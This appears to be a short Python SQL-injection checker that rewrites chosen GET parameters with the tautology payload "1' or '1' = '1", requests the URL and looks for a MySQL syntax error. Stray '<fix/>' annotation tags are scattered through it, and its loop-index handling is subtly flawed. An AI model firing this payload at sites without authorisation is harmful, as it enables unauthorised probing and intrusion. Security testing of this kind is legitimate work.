import sys
import urllib
import urllib.request
import re

<fix/># this script will check if GET parameters are injectables
#
# Parameters to set
# -p [parameter...]
#
# website URI
# use quotes around the URI if they are many parameters !
# -w [uri]
#
# example
# py sqli_checker.py -w "http://mywebsite.com/index.php?item=42&collection=3" -p item collection

""" Replace the attributes that are in to_inject by SQL
"""
def inject_SQL(uri, to_inject):
	first_part, second_part = uri.split('?')
	params = second_part.split('&')
	for i in range(len(params)):
		label, value = params[i].split('=')
		if label in to_inject:
			params[i] = label + "=1'%20or%20'1'%20=%20'1"

	return first_part + '?' + '&'.join(params)

regex_script_param = re.compile(r'^-[a-z]$')</fix>

uri = None
to_inject = []

<fix/>for i in range(len(sys.argv)):
	arg = sys.argv[i]</fix>
	# read the arg that follow -w
	<fix/>if arg == "-w":
		i += 1
		if len(sys.argv) > i:
			uri = sys.argv[i]

	# read all the args that follow -p
	if arg == '-p':
		i += 1
		# continu while there are args and the cursor is in the -p args list
		while len(sys.argv) > i and not re.match(regex_script_param, sys.argv[i]):
			to_inject.append(sys.argv[i])
			i += 1</fix>

# if there is no value for -w parameter, throw an error and exit
if uri is None:
	sys.exit("[ERROR] You have to pass the URI to test to the -w parameter !")

# make the request
<fix/>resp = urllib.request.urlopen(inject_SQL(uri, to_inject))</fix>

# parse response
body = resp.read()
full_body = body.decode('utf-8')

# check vulnerability by looking at the response
if "You have an error in your SQL syntax" in full_body:
	print ("Vulnerable to SQL injection !!")
else:
	print ("Not vulnerable to SQL injection.")
